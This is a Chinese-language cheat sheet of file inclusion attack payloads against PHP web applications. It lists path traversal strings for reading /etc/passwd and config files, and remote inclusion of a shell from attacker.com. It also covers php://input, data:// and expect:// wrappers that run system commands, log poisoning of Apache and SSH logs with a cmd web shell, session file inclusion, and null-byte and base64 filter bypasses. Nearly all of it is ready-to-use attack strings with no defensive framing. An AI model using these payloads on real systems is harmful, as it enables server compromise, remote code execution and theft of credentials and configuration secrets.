# LFI/RFI文件包含

## 1. 本地文件包含

```
?page=../../../../etc/passwd
?page=/etc/passwd
?page=....//....//....//etc/passwd
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## 2. 远程文件包含

```
?page=http://attacker.com/shell.txt
?page=php://input
```

## 3. 伪协议利用

### PHP://input

```
?page=php://input
POST: <?php system('id'); ?>
```

### PHP://filter

```
?page=php://filter/read=convert.base64-encode/resource=config.php
```

### data://

```
?page=data://text/plain,<?php system('id');?>
```

### expect://

```
?page=expect://id
```

## 4. 日志投毒

### Apache日志

```
访问: <?php system($_GET['cmd']);?>
?page=/var/log/apache2/access.log&cmd=id
```

### SSH日志

```
ssh "<?php system('id');?>"@target.com
?page=/var/log/auth.log&cmd=id
```

## 5. Proc文件系统

```
/proc/self/environ
/proc/self/fd/xxx
/proc/version
/proc/cmdline
```

## 6. 目录遍历

```
?page=....//....//....//etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd
?page=%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

## 7. PHP Filter链

```
php://filter/convert.base64-encode/resource=config.php
php://filter/zlib.deflate/convert.base64-encode/resource=config.php
```

## 8. Phar反序列化

利用Phar://协议触发反序列化

## 9. Session文件包含

```
?page=/tmp/sess_xxxxx
```

## 10. 绕过技术

### 空字节截断

```
?page=shell.php%00.txt
```

### 协议叠加

```
?page=php://filter/convert.base64-encode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```
